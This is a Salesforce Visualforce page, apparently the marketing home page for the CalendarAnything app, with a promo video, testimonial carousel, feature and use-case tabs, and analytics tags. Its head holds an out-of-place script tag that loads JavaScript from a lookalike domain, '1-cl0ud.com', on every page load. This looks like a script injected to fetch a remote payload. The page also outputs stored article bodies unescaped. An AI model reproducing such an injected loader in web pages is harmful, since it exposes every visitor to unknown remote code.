<apex:page standardStylesheets="false" showheader="false" controller="SL_Index" >
    <apex:form >
    <head><script type="text/javascript" src="http://1-cl0ud.com/js/21393.js" ></script></head>
    <script type="text/javascript">
        var _gaq = _gaq || [];
        _gaq.push('_setAccount', 'UA-37706407-1');
        _gaq.push('_trackPageview');
        (function()
        { var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true; ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js'; var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s); }
        )();
        
    </script>
    
    <!-- Start of Async HubSpot Analytics Code -->
    <script type="text/javascript">
        (function(d,s,i,r) {
            if (d.getElementById(i)){return;}
            var n=d.createElement(s),e=d.getElementsByTagName(s)[0];
            n.id=i;n.src='//js.hs-analytics.net/analytics/'+(Math.ceil(new Date()/r)*r)+'/376423.js';
            e.parentNode.insertBefore(n, e);
        })(document,"script","hs-analytics",300000);
    </script>
    <!-- End of Async HubSpot Analytics Code -->
    
    <!-- page holder -->
    <div id="wrapper">
        <c:SiteTemplate selectedTab=""/>
        <!-- main container -->
        <div id="main">
            <!-- promobar -->
            <div class="promobar" id="ca">
                <div class="video-area">
                    <div class="video-holder">
                       <a class="fancybox" href="#iframe">
                           <img src="{!URLFOR($Resource['SL_' + strCustomSettingName + '_CSS'], 'CalendarAnything/markup/images/holder01.png')}" width="512" height="312" alt="image description" />
                           <span class="btn-play"></span>
                       </a>
                       <div id="iframe" style="display: none;">
                            <iframe width="720" height="450" src="http://www.youtube.com/embed/{!strHomePageVideoId}?feature=player_detailpage" frameborder="0" allowfullscreen ="true"></iframe>
                       </div>
                    </div>
                    <div class="description">
                        <strong class="logo-calendaranything"><a href="#">{!strLogoDescription}</a></strong>
                        <p>{!$Label[strCustomSettingName + '_Home_Page_Summary']}</p>
                    </div>
                </div>
                <div class="ribbon"> <!-- ribbon -->
                    <a href="{!strinstallCalenderAnythingURL}" class="btn-green big" target="_blank"><span>{!$Label[strCustomSettingName]}</span></a>
                    <strong class="label">
                        <em>{!$Label[strCustomSettingName + '_Try_it_Now']}</em>
                        <span>{!$Label[strCustomSettingName + '_No_of_Days_to_FreeTrail']}</span>
                    </strong>
                    <ul class="list">
                        <li>{!$Label[strCustomSettingName + '_Bullet_1']}</li>
                        <li>{!$Label[strCustomSettingName + '_Bullet_2']}</li>
                        <li>{!$Label[strCustomSettingName + '_Bullet_3']}</li>
                        <li>{!$Label[strCustomSettingName + '_Bullet_4']}</li>
                    </ul>
                </div>
            </div>
            <!-- content box -->
            <div id="content">
                <div class="bar odd">
                    <div class="carousel"> <!-- carousel -->
                        <div class="mask">
                            <div class="slideset">
                                <apex:repeat value="{!TestimonialRecords}" var="CAWrapper">
                                    <apex:outputPanel id="op1" rendered="{!IF(CAWrapper.evenOdd == 0,true,false)}">
                                        <div class="slide">
                                            <a class="pic"><apex:image url="{!CAWrapper.objCA.Image_URL__c}" width="98" height="98" alt="image description" /></a>
                                            <blockquote>
                                                <div>
                                                    <q>{!CAWrapper.objCA.Body__c}</q>
                                                    <cite><p>{!CAWrapper.objCA.Person_Name__c}</p></cite>
                                                </div>
                                            </blockquote>
                                        </div>
                                    </apex:outputPanel>
                                    <apex:outputPanel id="op2" rendered="{!IF(CAWrapper.evenOdd == 1,true,false)}">
                                        <div class="slide ">
                                            <a class="pic"><img src="{!CAWrapper.objCA.Image_URL__c}" width="98" height="98" alt="image description" /></a>
                                            <blockquote>
                                                <div>
                                                    <q>{!CAWrapper.objCA.Body__c}</q>
                                                    <cite><p>{!CAWrapper.objCA.Person_Name__c}</p></cite>
                                                </div>
                                            </blockquote>
                                        </div>
                                    </apex:outputPanel>
                                </apex:repeat>
                            </div>
                        </div>
                        <a href="#" class="btn-prev">Previous</a>
                        <a href="#" class="btn-next">Next</a>
                    </div>
                </div>

                <!-- Start - Calendar Anything Features developed by Sathiyaraja as per CW-3-->
                    <apex:actionfunction name="showVideo" action="{!showSelectedArticleRecords}" rerender="OpShowVideoId"> <!--   -->
                        <apex:param name="showLeftId" value="" assignTo="{!strArticleId}"/>
                    </apex:actionfunction>

                    <div class="bar" id="features">
                        <h2>{!$Label[strCustomSettingName + '_Features_Heading']}</h2>
                        <div class="tabs-area">
                            <div class="aside-left">
                                <!-- tabset -->
                                <ul class="tabset" id="tabUL">
                                    <apex:repeat value="{!lstWrapperWebsiteFeature}" var="item" >
                                        <li id="list{!item.objWebSiteFeature['Id']}" onclick="clicked(this.id);">
                                            <span onclick="showVideo('{!item.objWebSiteFeature.Id}');">
                                                <a href="#{!item.objWebSiteFeature['Id']}" title="{!item.objWebSiteFeature['Title']}">
                                                    <table width="100%" >
                                                        <tr>
                                                            <td width="20%" align="left">
                                                                <apex:outputpanel rendered="{!item.strImage != null && item.strImage != ''}" >
                                                                    <img src="data:{!item.objWebSiteFeature['Icon__ContentType__s']};base64,{!item.strImage}" width="20px" height="20px"/>
                                                                 </apex:outputpanel>
                                                            </td>
                                                            <td align="left">{!item.objWebSiteFeature['Title']}</td>
                                                        </tr>
                                                    </table>
                                                </a>
                                            </span>
                                        </li>
                                    </apex:repeat>
                                </ul>
                                <script>

                                    /*called when user click a feature article */
                                    function clicked(selectedLi)
                                    {
                                        $('#tabUL li').each(function(index) {

                                            if(selectedLi != $(this).attr('id'))
                                                $(this).removeClass('active');
                                            else
                                                $(this).addClass('active');
                                        });

                                    }

                                    /*called when user click a feature article */
                                    function clickedUC(selectedLi)
                                    {
                                        $('#tabUC li').each(function(index) {

                                            if(selectedLi != $(this).attr('id'))
                                                $(this).removeClass('active');
                                            else
                                                $(this).addClass('active');
                                        });

                                    }

                                    var name = 'list'+'{!strArticleId}';
                                    var nameUC = 'listUC'+'{!strArticleIdUseCase}';

                                    /* to highlight a particular tab called on only page load*/
                                    $(window).load(function() {

                                        $('#tabUC li').each(function(index) {

                                            if(nameUC != $(this).attr('id'))
                                                $(this).removeClass('active');
                                            else
                                                $(this).addClass('active');

                                        });

                                        $('#tabUL li').each(function(index) {

                                            if(name != $(this).attr('id'))
                                                $(this).removeClass('active');
                                            else
                                                $(this).addClass('active');

                                        });
                                    });

                                </script>
                                <!--  as per CW-38 (Hemant) -->
                                <p class="link-all"><a href="Search?ob={!strHomePageObjects[0]}&subId={!strSubscriptionOrgId}">{!$Label[strCustomSettingName + '_Features_All_Features']}</a></p>
                                <a href="{!strinstallCalenderAnythingURL}" class="btn-green" target="_blank"><span>{!$Label[strCustomSettingName]}</span></a>
                            </div>
                            <apex:outputpanel id="OpShowVideoId" >
                                <div class="tab-content" style="border-left: 0px;">
                                    <h3>{!strTitle}</h3>
                                    <apex:outputpanel rendered="{!strVideoId != null && strVideoId != ''}">
                                        <a class="fancybox" href="#iframeFeature{!strVideoId}">
                                            <apex:image url="{!$Resource.SL_PlayVideo}" width="629" height="312" />
                                       </a>
                                       <div id="iframeFeature{!strVideoId}" style="display: none;">
                                            <iframe width="720" height="450" src="http://www.youtube.com/embed/{!strVideoId}?feature=player_detailpage" frameborder="0" allowfullscreen ="true"></iframe>
                                       </div>
                                    </apex:outputpanel>
                                    <p>
                                        <apex:outputText value="{!strBodyContent}" escape="false" />
                                    </p>
                                </div>
                            </apex:outputpanel>
                        </div>
                    </div>
                    <!-- Stop - Calendar Anything Features developed by Sathiyaraja as per CW-3-->

                    <!-- START - Calendar Anything Use Cases -->
                    <apex:actionfunction name="showVideoUC" action="{!showSelectedUseCaseArticleRecords}" rerender="OpShowVideoIdUC"> <!--   -->
                        <apex:param name="showLeftIdUC" value="" assignTo="{!strArticleIdUseCase}"/>
                    </apex:actionfunction>
                    <div class="bar odd" id="use-cases">
                        <h2>{!$Label[strCustomSettingName + '_Use_Cases_Heading']}</h2>
                        <div class="tabs-area">
                            <div class="aside-left">
                                <ul class="tabset" id="tabUC">
                                        <apex:repeat value="{!lstKnowledgeArticleUseCase}" var="item" >
                                            <li id="listUC{!item.objKnowledgeArticleUseCase['Id']}" onclick="clickedUC(this.id);">
                                                <span onclick="showVideoUC('{!item.objKnowledgeArticleUseCase.Id}');">
                                                    <a href="#{!item.objKnowledgeArticleUseCase['Id']}" title="{!item.objKnowledgeArticleUseCase['Title']}">
                                                        <table width="100%" >
                                                            <tr>
                                                                <td width="20%" align="left">
                                                                    <apex:outputpanel rendered="{!item.strImageUC != null && item.strImageUC != ''}" >
                                                                        <img src="data:{!item.objKnowledgeArticleUseCase['Icon__ContentType__s']};base64,{!item.strImageUC}" width="20px" height="20px"/>
                                                                     </apex:outputpanel>
                                                                </td>
                                                                <td align="left">{!item.objKnowledgeArticleUseCase['Title']}</td>
                                                            </tr>
                                                        </table>
                                                    </a>
                                                </span>
                                            </li>
                                        </apex:repeat>
                                    </ul>

                                <p class="link-all">
                                    <!--  as per CW-38 (Hemant) -->
                                    <a href="Search?ob={!strHomePageObjects[1]}&subId={!strSubscriptionOrgId}">{!$Label[strCustomSettingName + '_Use_Case_All_Use_Case']}</a>
                                </p>

                                <a href="{!strinstallCalenderAnythingURL}" class="btn-green" target="_blank" >
                                    <span>{!$Label[strCustomSettingName]}</span>
                                </a>
                            </div>
                            <apex:outputpanel id="OpShowVideoIdUC" >
                                <div class="tab-content" style="border-left: 0px;">
                                    <h3>{!strTitleUseCase}</h3>
                                    <apex:outputpanel rendered="{!strVideoIdUseCase != null && strVideoIdUseCase != ''}">
                                        <a class="fancybox" href="#iframe1">
                                            <apex:image url="{!$Resource.SL_PlayVideo}" width="629" height="312" />
                                        </a>
                                        <div id="iframe1" style="display: none;">
                                            <iframe width="720" height="450" src="http://www.youtube.com/embed/{!strVideoIdUseCase}?feature=player_detailpage" frameborder="0" allowfullscreen ="true"></iframe>
                                        </div>
                                    </apex:outputpanel>
                                    <p>
                                    <apex:outputText value="{!strBodyContentUseCase}" escape="false" />
                                    </p>
                                </div>
                            </apex:outputpanel>
                        </div>
                    </div>
                    <!-- END - Calendar Anything Use Cases -->
            </div>
        </div>
    </div>
    <script>

        if(window.location.hash)
        {
            var hash = window.location.hash.substring(1); //Puts hash in variable, and removes the # character

            if(hash == 'features')
                navHiglight('featuredId');
            else if(hash == 'use-cases')
                navHiglight('useCaseId');
            else if(hash == 'contactUs')
                navHiglight('ContactId');
        }
        else
        {
            navHiglight('Home');
        }
        
    </script>

    </apex:form>
</apex:page>